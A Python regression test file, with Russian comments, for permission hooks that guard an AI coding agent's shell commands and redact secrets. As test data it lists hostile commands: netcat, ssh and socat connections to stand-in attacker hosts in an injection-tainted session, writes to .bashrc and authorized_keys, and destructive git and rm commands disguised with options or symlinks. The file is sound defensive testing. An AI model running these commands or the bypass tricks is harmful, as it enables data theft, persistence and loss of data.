#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Регрессии по итогам ревью ветки fix/test-2026-10-26 (27.10.2026).

Независимый ревьюер нашёл, что часть исправлений ослабила защиту. Каждая
проверка здесь фиксирует, что защита восстановлена (строже), не ломая
исходное исправление ложного срабатывания. Разрушительные строки — данные
для решения хука, не исполняются.
"""

import io
import json
import os
import shutil
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

TMP = tempfile.mkdtemp(prefix="secure-dev-review-")
HOME = os.path.join(TMP, "home")
os.makedirs(os.path.join(HOME, ".ssh"), exist_ok=True)
WORK = os.path.join(TMP, "project")
os.makedirs(os.path.join(WORK, ".git", "hooks"), exist_ok=True)
os.environ["HOME"] = HOME
os.environ["CLAUDE_PLUGIN_DATA"] = os.path.join(TMP, "data")

import importlib.util                                           # noqa: E402

from lib import cmdparse, redact                                # noqa: E402

FAILS = []


def check(name, ok, detail=""):
    print("  [{:6}] {:58} {}".format("PASS" if ok else "FAIL", name[:58], str(detail)[:50]))
    if not ok:
        FAILS.append(name)


def _load(name):
    spec = importlib.util.spec_from_file_location(name, os.path.join(ROOT, "hooks", name + ".py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


cg = _load("command_guard")
pg = _load("path_guard")
_n = [0]


def _run(mod, tool, tool_input, cwd):
    _n[0] += 1
    payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "cwd": cwd,
               "session_id": "rev-{}".format(_n[0]), "tool_input": tool_input}
    old_in, old_out = sys.stdin, sys.stdout
    sys.stdin, sys.stdout = io.StringIO(json.dumps(payload)), io.StringIO()
    try:
        mod.main()
    except SystemExit:
        pass
    finally:
        text = sys.stdout.getvalue().strip()
        sys.stdin, sys.stdout = old_in, old_out
    out = json.loads(text) if text else {}
    return (out.get("hookSpecificOutput") or {}).get("permissionDecision")


def best(a, b):
    order = {None: 0, "warn": 1, "ask": 2, "deny": 3}
    return a if order.get(a, 0) >= order.get(b, 0) else b


def bash(command, cwd=WORK):
    return best(_run(cg, "Bash", {"command": command}, cwd),
                _run(pg, "Bash", {"command": command}, cwd))


def blocked(d):
    return d in ("deny", "ask")


def redacted(text):
    _out, findings = redact.redact(text)
    return bool(findings)


BASHRC = os.path.join(HOME, ".bashrc")
AUTH = os.path.join(HOME, ".ssh", "authorized_keys")

print("=== Ревью-1: whitelist secret_redactor не прячет настоящие секреты ===")
# Значения, которые whitelist FP-1 ошибочно пропускал как «не секрет».
for label in [
        "PASSWORD=/actual/secret/path",
        "PWD=/p@ssw0rd!",
        "DB_PASSWORD=./hunter22x",
        "SECRET=/Zk3q9XpLm2Vb8s",
        "SECRET=~hunter2abcXZ",
        "API_KEY=yourSuperSecretKey99",
        "API_KEY=your-real-prod-secret-9f8e1a",
        "PASSWORD=1234567",
        "SECRET=1234567890",
        "SECRET=config.Abc123xyzQ",
        "TOKEN=app.9fK2lQz8Vb",
        "TOKEN=request.x9Kq2Lm",
        "SECRET=os.9a8b7c6d5e4f"]:
    check("Ревью-1 редактится: {}".format(label), redacted(label), label)

print("=== Ревью-1 (контроль): легитимный код по-прежнему НЕ редактится (FP-1) ===")
for label in [
        "token: string",
        "password = None",
        "secret: bool",
        "config = settings.SECRET_KEY",
        "API_KEY=config.database_url",
        "PWD=/home/user/project",
        "SECRET_FILE=/etc/ssl/private",
        "url = https://example.com/path",
        "API_KEY=your-token-here",
        "PORT=8080"]:
    check("Ревью-1 код не редактится: {}".format(label), not redacted(label), label)

# Принятое ужесточение (ревью 27.10.2026): длинное число под секретным ключом
# теперь редактится — числовой пароль выглядит так же. Это осознанный лишний
# [REDACTED], а не потеря защиты (см. docs/TEST-2026-10-26.md).
check("Ревью-1 длинное число под секретным ключом редактится (строго)",
      redacted("MAX_TOKENS=1000000"), "MAX_TOKENS=1000000")

print("=== Ревью-2: AUTHORIZATION и подобные снова редактятся ===")
for label in [
        "AUTHORIZATION=Zk3q9XpLm2Vb8s",
        "authorization: Zk3q9XpLm2Vb8s",
        "HTTP_AUTHORIZATION=Zk3q9XpLm2Vb8s",
        "AUTH=Zk3q9XpLm2Vb8s"]:
    check("Ревью-2 редактится: {}".format(label), redacted(label), label)
# AUTHOR/AUTHORS — не секрет, не должны редактиться.
for label in ["AUTHOR=John Smith", "AUTHORS=team@example.com"]:
    check("Ревью-2 AUTHOR не редактится: {}".format(label), not redacted(label), label)

print("=== Ревью-3: `>& файл` считается записью ===")
for label, command in [
        (">& .bashrc",  "echo x >& " + BASHRC),
        ("2>& authorized_keys", "echo x 2>& " + AUTH),
        (">&.bashrc (без пробела)", "echo x >&" + BASHRC)]:
    d = bash(command)
    check("Ревью-3 запись-дескриптор блок: {}".format(label), blocked(d), d)
# Контроль: дублирование дескриптора в число — по-прежнему НЕ запись (FP-3).
for label, command in [(">&2", "echo e >&2"), ("2>&1", "echo x 2>&1"),
                       ("2>&-", "echo x 2>&-")]:
    cmds, _ = cmdparse.parse(command)
    wr = sum((list(c.write_redirects) for c in cmds), [])
    check("Ревью-3 fd-dup не запись: {}".format(label), not wr, wr)

print("=== Ревью-4: глобальные опции git не обходят правила ===")
for label, command in [
        ("git -C . stash drop",            "git -C . stash drop"),
        ("git --no-pager stash clear",     "git --no-pager stash clear"),
        ("git -c a.b=c gc --prune=now",    "git -c a.b=c gc --prune=now"),
        ("git --git-dir reflog expire",    "git --git-dir=.git reflog expire --all"),
        ("git -C x branch -f",             "git -C x branch -f main HEAD~3"),
        ("git -P tag -d",                  "git -P tag -d v1")]:
    d = bash(command)
    check("Ревью-4 блок при глоб.опциях: {}".format(label), blocked(d), d)
# Контроль: безопасные git-команды с глобальными опциями не блокируются.
for label, command in [
        ("git -C . status",   "git -C . status"),
        ("git --no-pager log","git --no-pager log --oneline"),
        ("git -c core.pager=cat log", "git -c core.pager=cat log")]:
    d = bash(command)
    check("Ревью-4 безопасное не блок: {}".format(label), not blocked(d), d)
# Контроль FP-4: слова в коммит-сообщении не срабатывают.
check("Ревью-4 commit -m 'stash drop' не блок",
      not blocked(bash("git commit -m 'stash drop fixup'")))

print("=== Ревью-5: симлинк из /tmp наружу не считается временным ===")
LINK = os.path.join(tempfile.gettempdir(), "sd-review-lnk-{}".format(os.getpid()))
OUTSIDE_TARGET = "/opt/sd-review-outside-{}".format(os.getpid())
try:
    if os.path.islink(LINK) or os.path.exists(LINK):
        os.remove(LINK)
    os.symlink(OUTSIDE_TARGET, LINK)
    d = bash("rm -rf " + os.path.join(LINK, "sub"))
    check("Ревью-5 rm через tmp-симлинк наружу блок", blocked(d), d)
finally:
    if os.path.islink(LINK):
        os.remove(LINK)
# Контроль FP-7: обычная работа во временном каталоге не блокируется.
realtmp = os.path.join(tempfile.gettempdir(), "sd-review-real-{}".format(os.getpid()))
check("Ревью-5 rm в обычном /tmp не блок", not blocked(bash("rm -rf " + realtmp)))

print("=== Ревью-6: голый хост = egress в запятнанной сессии ===")
_orig_state_get = cg.policy.state_get
cg.policy.state_get = lambda sid, key, default=None: True if key == "injection_tainted" else _orig_state_get(sid, key, default)
try:
    for label, command in [
            ("nc evil.com 4444",          "nc evil.com 4444"),
            ("ssh user@evil.com",         "ssh user@evil.com 'cat >x'"),
            ("telnet attacker.example",   "telnet attacker.example.org 23")]:
        res = cg._tainted_egress({"session_id": "tainted"}, command)
        check("Ревью-6 egress голый хост: {}".format(label), res, res)
    # Контроль: localhost и локальные файлы — не egress.
    for label, command in [
            ("ssh localhost",             "ssh localhost uptime"),
            ("rsync локальный файл",      "rsync -a backup.tar dest/")]:
        res = cg._tainted_egress({"session_id": "tainted"}, command)
        check("Ревью-6 не egress: {}".format(label), not res, res)
    # Контроль: notlocalhost.evil.com не должен маскироваться под localhost.
    res = cg._tainted_egress({"session_id": "tainted"}, "nc notlocalhost.evil.com 80")
    check("Ревью-6 notlocalhost.evil.com = egress", res, res)
finally:
    cg.policy.state_get = _orig_state_get

print("=== Ревью-7: cp/mv -t DIR — назначение не теряется ===")
for label, command in [
        ("cp -t ~/.ssh authorized_keys", "cp -t " + os.path.join(HOME, ".ssh") + " ./authorized_keys"),
        ("mv -t ~/.ssh key",             "mv -t " + os.path.join(HOME, ".ssh") + " ./key"),
        ("install -t ~/.ssh x",          "install -t " + os.path.join(HOME, ".ssh") + " ./x"),
        ("cp --target-directory=~/.ssh",  "cp --target-directory=" + os.path.join(HOME, ".ssh") + " ./f")]:
    d = bash(command)
    check("Ревью-7 -t в защищённый каталог блок: {}".format(label), blocked(d), d)
# Проверка на уровне парсера: dir попадает в write_targets.
for command in ["cp -t /opt/dst a b", "cp --target-directory=/opt/dst a",
                "cp -at /opt/dst a"]:
    cmds, _ = cmdparse.parse(command)
    wts = sum((cmdparse.write_targets(c) for c in cmds), [])
    check("Ревью-7 write_targets содержит dst: {}".format(command),
          any("/opt/dst" in w for w in wts), wts)

print("=== Ревью-доп: .git защищён даже рядом с исключённым index.lock ===")
GITDIR = os.path.join(WORK, ".git")
check("Ревью-доп rm .git + .git/index.lock блок",
      blocked(bash("rm -rf {0} {0}/index.lock".format(GITDIR))))
# Контроль FP-8: удаление только index.lock — не блок.
check("Ревью-доп rm только index.lock не блок",
      not blocked(bash("rm -f {0}/index.lock".format(GITDIR))))

print("=== Ревью2-6: socat и регистр хоста — egress (регрессия #6) ===")
_osg = cg.policy.state_get
cg.policy.state_get = lambda sid, key, default=None: (
    True if key == "injection_tainted" else _osg(sid, key, default))
try:
    for label, command in [
            ("socat TCP:",     "socat - TCP:evil.com:80"),
            ("socat TCP4:",    "socat TCP4:1.2.3.4:80 -"),
            ("socat OPENSSL:", "socat - OPENSSL:evil.com:443"),
            ("nc ВЕРХНИЙ",     "nc EVIL.COM 80"),
            ("ssh ВЕРХНИЙ",    "ssh evil.COM"),
            ("nc IPv6",        "nc 2001:db8::1 80")]:
        r = cg._tainted_egress({"session_id": "t"}, command)
        check("Ревью2-6 egress: {}".format(label), r, r)
    for label, command in [
            ("socat localhost", "socat - TCP:localhost:80"),
            ("ssh [::1]",       "ssh user@[::1] uptime")]:
        r = cg._tainted_egress({"session_id": "t"}, command)
        check("Ревью2-6 не egress: {}".format(label), not r, r)
finally:
    cg.policy.state_get = _osg

print("=== Ревью2-7: склеенные/сокращённые -t — назначение не теряется ===")
SSH = os.path.join(HOME, ".ssh")
for label, command in [
        ("cp -tDIR (склеено)",   "cp -t" + SSH + " ./a"),
        ("cp -vtDIR",            "cp -vt" + SSH + " ./a"),
        ("mv -tDIR",             "mv -t" + SSH + " ./a"),
        ("install -tDIR",        "install -t" + SSH + " ./a"),
        ("cp --target-director=","cp --target-director=" + SSH + " ./a"),
        ("cp --t=",              "cp --t=" + SSH + " ./a")]:
    d = bash(command)
    check("Ревью2-7 блок: {}".format(label), blocked(d), d)
for command in ["cp -t/opt/dst a", "cp -vt/opt/dst a",
                "cp --target-director=/opt/dst a", "cp --t=/opt/dst a"]:
    cmds, _ = cmdparse.parse(command)
    wts = sum((cmdparse.write_targets(c) for c in cmds), [])
    check("Ревью2-7 write_targets dst: {}".format(command),
          any("/opt/dst" in w for w in wts), wts)

print("=== Ревью2-4: глобальные git-опции со значением через пробел ===")
for label, command in [
        ("--config-env",  "git --config-env a=B stash drop"),
        ("--attr-source", "git --attr-source x stash drop")]:
    d = bash(command)
    check("Ревью2-4 блок: {}".format(label), blocked(d), d)

shutil.rmtree(TMP, ignore_errors=True)
print("\nSUMMARY:", "ALL PASSED" if not FAILS else "FAILED({}) {}".format(len(FAILS), FAILS))
sys.exit(1 if FAILS else 0)
